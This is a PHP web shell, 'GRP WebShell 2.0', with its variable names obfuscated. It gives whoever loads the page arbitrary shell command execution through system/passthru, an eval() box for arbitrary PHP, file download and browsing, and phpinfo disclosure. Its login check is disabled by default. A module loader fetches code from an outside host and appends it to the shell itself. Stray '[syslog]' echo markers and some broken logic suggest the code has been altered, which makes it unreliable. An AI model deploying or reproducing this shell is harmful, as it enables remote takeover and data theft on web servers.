<?php
echo '[syslog]01
'; $sp2debd4 = 0; $sp5a89db = 0; $spbe22e1 = 0; $sp5ab24c = 'http://localhost/'; $spa4e574 = 1; $sp447583 = 'http://cribble.by.ru/grp_mod/'; $sp2e61ae = array('browse' => 'File browser', 'mysql' => 'MySQL'); $sp3e1321 = 'GRP WebShell 2.0 release build 2018 (C)2006,Great'; $sp6ee69e = '63191e4ece37523c9fe6bb62a5e64d45'; $sp7158a0 = '47ce56ef73da9dec757ef654e6aa1ca1'; $spc9aa41 = 'Enter your login and password'; if ($sp2debd4 && (!isset($spcc4b86['PHP_AUTH_USER']) || md5($spcc4b86['PHP_AUTH_USER']) != $sp6ee69e || md5($spcc4b86['PHP_AUTH_PW']) != $sp7158a0)) { header("WWW-Authenticate: Basic realm=\"{$spc9aa41}\""); header('HTTP/1.0 401 Unauthorized'); die('<h1>Unauthorized access</h1>'); } echo '[syslog]02
'; if ($spa4e574) { error_reporting(E_ALL & ~E_NOTICE); } else { error_reporting(0); } if (get_magic_quotes_gpc()) { foreach (array('_POST', '_GET', '_FILES', '_COOKIE') as $sp810b70) { foreach ($spd3aeac[$sp810b70] as $spf38c9d => $spc85aba) { $spd3aeac[$sp810b70][$spf38c9d] = stripslashes($spc85aba); } } } echo '[syslog]03
'; function post_form($sp6ee69e, $spd3cd3d, $sp62a453 = '', $sp47eda8 = '') { static $spc58e00 = 0; echo "<form method='post' name='PostActForm{$spc58e00}'>\n"; foreach ($spd3cd3d as $sp5b128e => $spc85aba) { echo "<input type='hidden' name='{$sp5b128e}' value='{$spc85aba}'>\n"; } echo "{$sp62a453}<a href='javascript:void(0);' onClick='document.PostActForm{$spc58e00}.submit()'>{$sp6ee69e}</a>{$sp47eda8}</form>\n"; $spc58e00++; } function post_empty_form($spd3cd3d) { static $spc58e00 = 0; echo "<form method='post' name='PostEmptyForm{$spc58e00}'>\n"; foreach ($spd3cd3d as $sp5b128e => $spc85aba) { echo "<input type='hidden' name='{$sp5b128e}' value='{$spc85aba}'>\n"; } echo '</form>
'; $spc58e00++; return $spc58e00 - 1; } function submit_empty_form($spc58e00, $sp6ee69e) { echo "<a href='javascript:void(0);' onClick='document.PostEmptyForm{$spc58e00}.submit()'>{$sp6ee69e}</a>"; } function confirm_empty_form($spc58e00, $sp6ee69e, $spa7f998) { echo "<a href='javascript:void(0);' onClick='if(confirm(\"{$spa7f998}\")){document.PostEmptyForm{$spc58e00}.submit()}'>{$sp6ee69e}</a>"; } function redirect($spb3d986) { echo "<meta http-equiv=\"refresh\" content=\"0;url='{$spb3d986}'\">"; } echo '[syslog]04
'; function filesperms($sp8f7201) { $spd88282 = fileperms($sp8f7201); if (($spd88282 & 49152) == 49152) { $sp343538 = 's'; } elseif (($spd88282 & 40960) == 40960) { $sp343538 = 'l'; } elseif (($spd88282 & 32768) == 32768) { $sp343538 = '-'; } elseif (($spd88282 & 24576) == 24576) { $sp343538 = 'b'; } elseif (($spd88282 & 16384) == 16384) { $sp343538 = 'd'; } elseif (($spd88282 & 8192) == 8192) { $sp343538 = 'c'; } elseif (($spd88282 & 4096) == 4096) { $sp343538 = 'p'; } else { $sp343538 = 'u'; } $sp343538 .= $spd88282 & 256 ? 'r' : '-'; $sp343538 .= $spd88282 & 128 ? 'w' : '-'; $sp343538 .= $spd88282 & 64 ? $spd88282 & 2048 ? 's' : 'x' : ($spd88282 & 2048 ? 'S' : '-'); $sp343538 .= $spd88282 & 32 ? 'r' : '-'; $sp343538 .= $spd88282 & 16 ? 'w' : '-'; $sp343538 .= $spd88282 & 8 ? $spd88282 & 1024 ? 's' : 'x' : ($spd88282 & 1024 ? 'S' : '-'); $sp343538 .= $spd88282 & 4 ? 'r' : '-'; $sp343538 .= $spd88282 & 2 ? 'w' : '-'; $sp343538 .= $spd88282 & 1 ? $spd88282 & 512 ? 't' : 'x' : ($spd88282 & 512 ? 'T' : '-'); return $sp343538; } function filesmtime($sp8f7201) { return date('d M Y H:i:s', filemtime($sp8f7201)); } function headers() { return "{$_SERVER['REQUEST_METHOD']} {$_SERVER['PHP_SELF']} {$_SERVER['SERVER_PROTOCOL']}\\n\r\nAccept: {$_SERVER['HTTP_ACCEPT']}\\n\r\nAccept-Charset: {$_SERVER['HTTP_ACCEPT_CHARSET']}\\n\r\nAccept-Encoding: {$_SERVER['HTTP_ACCEPT_ENCODING']}\\n\r\nAccept-Language: {$_SERVER['HTTP_ACCEPT_LANGUAGE']}\\n\r\nCache-Control: {$_SERVER['HTTP_CACHE_CONTROL']}\\n\r\nConnection: {$_SERVER['HTTP_CONNECTION']}\\n\r\nHost: {$_SERVER['HTTP_HOST']}\\n\r\nUser-Agent: {$_SERVER['HTTP_USER_AGENT']}\\n\r\n"; } if ($_POST['act'] == 'toolz' && $_POST['subact'] == 'phpinfo') { die(phpinfo()); } if ($_POST['act'] == 'downfile') { $sp79f04a = $_POST['curdir']; $sp8f7201 = $_POST['file']; if (!file_exists($sp79f04a . '/' . $sp8f7201)) { die('Cannot find file ' . $sp79f04a . '/' . $sp8f7201); } if (!is_file($sp79f04a . '/' . $sp8f7201)) { die($sp79f04a . '/' . $sp8f7201 . ' is not a regular file'); } Header('Content-Type: application/x-octet-stream'); Header('Content-Disposition: attachement;filename=' . $sp8f7201); die(join('', file($sp79f04a . '/' . $sp8f7201))); } if ($_POST['act'] == 'preview') { chdir($_POST['curdir']); if (!file_exists($_POST['file'])) { die('Can\'t find file'); } $spf1af95 = explode('.', $_POST['file']); $sp0beeb7 = strtolower($spf1af95[count($spf1af95) - 1]); if (in_array($sp0beeb7, array('png', 'jpg', 'jpeg', 'bmp', 'gif', 'tiff', 'pcx'))) { Header("Content-Type: image/{$sp0beeb7}"); } elseif (in_array($sp0beeb7, array('htm', 'html', 'plg'))) { Header('Content-Type: text/html'); } elseif (in_array($sp0beeb7, array('php'))) { include $_POST['file']; die; } else { Header('Content-Type: text/plain'); } @readfile($_POST['file']); die; } ?>
<html>
<head>
<title><?php  echo $sp3e1321; ?>
</title>
<style type='text/css'>
A { text-decoration: none; color: white }
</style>
</head>
<body bgcolor='black' vlink='blue' alink='blue' link='blue' text='white'>
<noscript><br><br><br><h1 align='center'><font color='red'>You need JavaScript to be enabled to run this page!</font></h1><br><br><br></noscript>
<?php  ?>
<center>
<table border=0 width=100%><tr><td><table border=0><tr>
<form method='post' name='main_empty_form'><input type='hidden' name='act'><input type='hidden' name='curdir'><input type='hidden' name='file'><input type='hidden' name='subact'></form>
<?php  echo '<td><b>'; post_form('Shell', array(), '', ' |'); $spa42e4d = array(); foreach ($sp2e61ae as $sp4502aa => $sp6ee69e) { if (function_exists('mod_' . $sp4502aa)) { echo '</b><td><b>'; post_form($sp6ee69e, array('act' => $sp4502aa), '', ' |'); $spa42e4d[] = $sp4502aa; } } echo '</b><td><b>'; post_form('Toolz', array('act' => 'toolz')); echo '</table><td align=right width=50%>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<table style=\'border: 1px solid\' width=100%><tr><td>'; echo '<b>Modules installed:</b>&nbsp;&nbsp;&nbsp;'; $spd29ba7 = 1; foreach ($spa42e4d as $sp4502aa) { if (!$spd29ba7) { echo ', '; } if ($sp4502aa == $_POST['act']) { echo '<b>' . $sp4502aa . '</b>'; } else { echo $sp4502aa; } $spd29ba7 = 0; } if ($spd29ba7 == 1) { echo 'None'; } ?>
<td align=right>
<?php  echo '[syslog]05
'; if (file_exists('grp_repair.php')) { echo '<input type=\'button\' value=\'Repair\' onClick=\'window.top.location.href="grp_repair.php";\' /><input type=\'button\' value=\'Delete Repair\' onClick=\'window.top.location.href="grp_repair.php?delete";\' /> '; } ?>
<input type='button' value='Load more...' onClick='document.main_empty_form.act.value="load_modules";document.main_empty_form.submit();' />
</table></table>
</center>
<p>
<table border=0>
<tr><td>
<table style='border: 1px solid' cellspacing=5>
<tr><td colspan=2 align='center'><b>Server information</b>
<tr><td>
<?php  $sp8e899a = 'unk'; $sp53b5e0 = @ini_get('safe_mode'); if ($sp53b5e0 == 1) { echo '<b>Safe Mode</b>&nbsp;&nbsp;<td>On<tr><td>'; } else { echo '<b>Operating system</b>&nbsp;&nbsp;<td>'; $sp87e27c = 'true'; if (substr($sp87e27c, 0, 9) == 'Microsoft') { echo $sp87e27c; $sp8e899a = 'win'; } else { $spcfe40d = 'true'; if (substr($spcfe40d, 0, 3) == 'uid') { $sp8e899a = 'nix'; } else { echo 'Unknown, not a Windows '; } } if ($sp8e899a == 'nix') { echo '<tr><td><b>id<b>&nbsp;&nbsp;<td>' . exec('id') . '</tr>'; } } echo "<tr><td><b>Server software</b>&nbsp;&nbsp;<td>{$_SERVER['SERVER_SOFTWARE']}"; if ($sp8e899a == 'nix') { $sp2ce5ce = 'true'; $sp119184 = 'ls -liaF'; } elseif ($sp8e899a == 'win') { $sp2ce5ce = 'true'; $sp119184 = 'dir'; } if (empty($sp2ce5ce)) { $sp2ce5ce = getcwd(); } ?>
</table>
<td>
<table style='border: 1px solid' cellspacing=5>
<tr><td colspan=2 align='center'><b>Client information</b>
<tr><td><b>Client's IP</b>&nbsp;&nbsp;<td><a href="javascript:alert('Host: <?php  echo gethostbyname($_SERVER['REMOTE_ADDR']); ?>
');"><?php  echo $_SERVER['REMOTE_ADDR']; ?>
</a>
<tr><td><b>Client's browser</b>&nbsp;&nbsp;<td><a href="javascript: alert('HTTP Headers:\n\n<?php  echo headers(); ?>
');"><?php  echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?>
</a>
</table>
</table>
<p>
<?php  if (ini_get('register_globals') != '1') { if (!empty($spe080f3)) { extract($spe080f3); } if (!empty($spb058a0)) { extract($spb058a0); } if (!empty($spcc4b86)) { extract($spcc4b86); } } if ($_POST['act'] == 'toolz') { ?>
<h3>Tools</h3>
<?php  $sp9fea57 = post_empty_form(array('act' => 'toolz', 'subact' => 'phpinfo')); $sp107e16 = post_empty_form(array('act' => 'toolz', 'subact' => 'phpcode')); ?>
<ul>
<li><?php  submit_empty_form($sp9fea57, 'Phpinfo'); ?>
<li><?php  submit_empty_form($sp107e16, 'Evaluate php code'); ?>
</ul>
<?php  if ($_POST['subact'] == 'phpcode') { if (!isset($_POST['code'])) { $_POST['code'] = 'print_r($_SERVER);'; } echo '<br /><form method=\'post\' name=\'phpcode\'>
        <input type=\'hidden\' name=\'act\' value=\'toolz\'>
        <input type=\'hidden\' name=\'subact\' value=\'phpcode\'>
        <input type=\'checkbox\' name=\'pre\'' . ($_POST['pre'] == 'on' ? ' checked' : '') . ">\r\n         <a href=\"javascript:void(0);\" onClick=\"document.phpcode.pre.checked=!document.phpcode.pre.checked\">Append &lt;pre&gt; tags</a><br>\r\n        <textarea name='code' cols=70 rows=20>{$_POST['code']}</textarea>\r\n        <br />\r\n        <input type='submit' name='go' value='Eval'>\r\n        </form>"; if (isset($_POST['go'])) { echo '<p>Result is:<br />'; if ($_POST['pre'] == 'on') { echo '<pre>'; eval($_POST['code']); echo '</pre>'; } else { echo eval($_POST['code']); } } } ?>
</ul>
<?php  } elseif (function_exists('mod_' . $_POST['act'])) { eval('mod_' . $_POST['act'] . '();'); } elseif ($_POST['act'] == 'load_modules') { echo '<h3>Module loader</h3>'; if ($_POST['subact'] == 'autoload') { $spbe6fe2 = join('', file($sp447583 . 'mod_' . $_POST['module'] . '.txt')); if ($spbe6fe2 === false) { die('Module is unavailable'); } $sp1b12d5 = explode('/', $_SERVER['PHP_SELF']); $sp6ee69e = $sp1b12d5[count($sp1b12d5) - 1]; copy($sp6ee69e, '~' . $sp6ee69e); $sp77bd8d = fopen('grp_repair.php', 'w'); if ($sp77bd8d) { $sp4074c2 = '
'; fwrite($sp77bd8d, '<?php' . $sp4074c2 . '$name="' . $sp6ee69e . '";' . $sp4074c2 . 'if($_SERVER[QUERY_STRING]=="delete") {unlink("grp_repair.php");unlink("~".$name);}else{' . $sp4074c2 . 'unlink($name);' . $sp4074c2 . 'rename("~".$name, $name);' . $sp4074c2 . 'unlink("grp_repair.php");}' . $sp4074c2 . '?>' . "<meta http-equiv=\"refresh\" content=\"0;url='{$sp6ee69e}'\">"); fclose($sp77bd8d); $spe02e69 = 1; } else { $spe02e69 = 0; } $spb7c1fd = fopen($sp6ee69e, 'a+') or die('Can\'t open ' . $sp6ee69e . ' to append module'); fwrite($spb7c1fd, $spbe6fe2); fclose($spb7c1fd); echo '<b><font color=\'green\'>Module installed successfully</font></b><br /><b>WARNING!</b> Shell file has been backuped. If you\'ll have problems with installed module, you can '; if ($spe02e69) { echo 'run \'grp_repair.php\' to forget changes'; } else { echo 'backup file manually from \'~' . $sp6ee69e . '\' (shell was unable to create self-repairing module)'; } echo '<br /><small>You\'ll be automatically redirected in 3 seconds</small><meta http-equiv="refresh" content="3;url=\'\'">'; } else { echo '<b>Supported modules are</b>: '; $spd29ba7 = 1; foreach ($sp2e61ae as $sp4502aa => $sp6ee69e) { if (!$spd29ba7) { echo ', '; } echo $sp6ee69e . ' (' . $sp4502aa . ')'; $spd29ba7 = 0; } if ($spd29ba7 == 1) { echo 'None'; } echo "<br /><b>Modules base load URL</b>: {$sp447583}<p><font color='gray'><b>Modules can be installed:</b></font>\r\n          (<font color='green'>Ready</font>, <font color='red'>Failure</font>)<br />"; foreach ($sp2e61ae as $sp4502aa => $sp6ee69e) { $sp64819c[$sp4502aa] = post_empty_form(array('act' => 'load_modules', 'subact' => 'autoload', 'module' => $sp4502aa)); } echo '<table border=0>'; foreach ($sp2e61ae as $sp4502aa => $sp6ee69e) { $spa509b0 = '<font color=\'green\'>'; $sp61da4e = '</font>'; $spbe6fe2 = @join('', @file($sp447583 . 'mod_' . $sp4502aa . '.txt')); if (!preg_match('#function mod_#i', $spbe6fe2)) { $spa509b0 = '<font color=\'red\'>'; } echo '<tr><td>' . $spa509b0 . $sp6ee69e . ' (' . $sp4502aa . ')' . $sp61da4e . '<td><a href=\'' . $sp447583 . 'mod_' . $sp4502aa . '.txt\' target=_blank>[SOURCE]</a><td>'; if (function_exists('mod_' . $sp4502aa)) { echo '<font color=\'gray\'>[ALREADY INSTALLED]</font>'; } elseif ($spa509b0 == '<font color=\'green\'>') { submit_empty_form($sp64819c[$sp4502aa], '[INSTALL]'); } else { echo '<font color=\'gray\'>[CAN\'T INSTALL]</font>'; } echo '</tr>'; } echo '</table>'; } } else { if (!empty($spf10957)) { if (!empty($spca5e05)) { if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $spca5e05, $sp27341b)) { if ($sp27341b[1][0] == '/') { $spa371e7 = $sp27341b[1]; } else { $spa371e7 = $spf10957 . '/' . $sp27341b[1]; } if (file_exists($spa371e7) && is_dir($spa371e7)) { $spf10957 = $spa371e7; } unset($spca5e05); } } } echo '[syslog]06
'; unset($sp79f04a); if ($sp53b5e0 == 1) { die('<font color=\'red\'><b>Safe mode is turned On! Command line is unavailable</b></font>'); } if (isset($_POST['curdir'])) { $sp79f04a = $_POST['curdir']; } else { $sp79f04a = $sp2ce5ce; } if ($sp8e899a == 'win') { $sp79f04a = str_replace('/', '\\', $sp79f04a); } ?>
<form name="execform" method="post">
<table border=0>
<tr><td>Command: <td><input type="text" name="command" size="60" value="<?php  echo $_POST['command'] == '' ? $sp119184 : $_POST['command']; ?>
">
    <td><a href="#" onClick="document.execform.command.value='<?php  echo $sp119184; ?>
'">Set default [<?php  echo $sp119184; ?>
]</a>
<tr><td><a href="#" onClick="document.execform.stderr.checked=!document.execform.stderr.checked">Disable stderr-grabbing?</a><td><input type="checkbox" name="stderr"<?php  echo $_POST['stderr'] == 'on' ? ' checked' : ''; ?>
>
<tr><td>Working directory:<td><input type="text" name="curdir" size="60" value="<?php  echo $sp79f04a; ?>
">
    <td><a href="#" onClick="document.execform.curdir.value='<?php  echo addslashes($sp2ce5ce); ?>
'">Restore as home directory [<?php  echo htmlspecialchars($sp2ce5ce); ?>
]</a>
<tr><td colspan=2><input name="submit_btn" type="submit" value="Execute Command">
</table>
</form>
<textarea cols="80" rows="29" readonly>
<?php  function excmd($spa71965) { if (function_exists('system')) { system($spa71965); return true; } if (function_exists('exec')) { echo join('
', $spb00cc1); return true; } if (function_exists('passthru')) { passthru($spa71965); return true; } return false; } if (!empty($spca5e05)) { if (!$spe17de8) { $spca5e05 .= ' 2>&1'; } if ($sp8e899a == 'nix') { excmd("cd {$sp79f04a}; {$spca5e05}"); } elseif ($sp8e899a == 'win') { excmd("cd {$sp79f04a} & {$spca5e05}"); } elseif ($sp8e899a == 'unk') { chdir($sp79f04a); excmd($spca5e05); } } echo '[syslog]07
'; ?>
</textarea>
</form>
<script language="JavaScript" type="text/javascript">
document.execform.command.focus();
</script>
<?php  } ?>
</body>
</html>

<?php 